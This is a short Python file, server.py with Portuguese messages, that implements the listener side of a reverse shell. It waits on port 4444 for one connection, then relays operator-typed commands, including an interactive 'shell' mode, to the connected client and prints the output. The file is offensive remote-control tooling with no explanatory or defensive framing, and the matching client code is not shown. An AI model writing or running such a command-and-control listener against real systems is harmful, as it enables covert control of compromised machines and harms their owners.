# server.py
import socket

def main():
    host = "0.0.0.0"
    port = 4444

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"[+] Aguardando conexão em {host}:{port}...")

    client_socket, client_addr = server.accept()
    print(f"[+] Conexão recebida de {client_addr}")

    while True:
        cmd = input("Shell> ").strip()
        if cmd.lower() in ["exit", "quit"]:
            client_socket.send(cmd.encode())
            break
        elif cmd.lower() == "shell":
            client_socket.send(cmd.encode())
            print(client_socket.recv(1024).decode())  # resposta de entrada
            while True:
                sub_cmd = input("SHELL> ").strip()
                if sub_cmd.lower() in ["exit", "quit"]:
                    client_socket.send(sub_cmd.encode())
                    break
                client_socket.send(sub_cmd.encode())
                resp = client_socket.recv(4096).decode(errors="ignore")
                print(resp)
        else:
            client_socket.send(cmd.encode())
            result = client_socket.recv(4096).decode(errors="ignore")
            print(result)

    client_socket.close()
    server.close()

if __name__ == "__main__":
    main()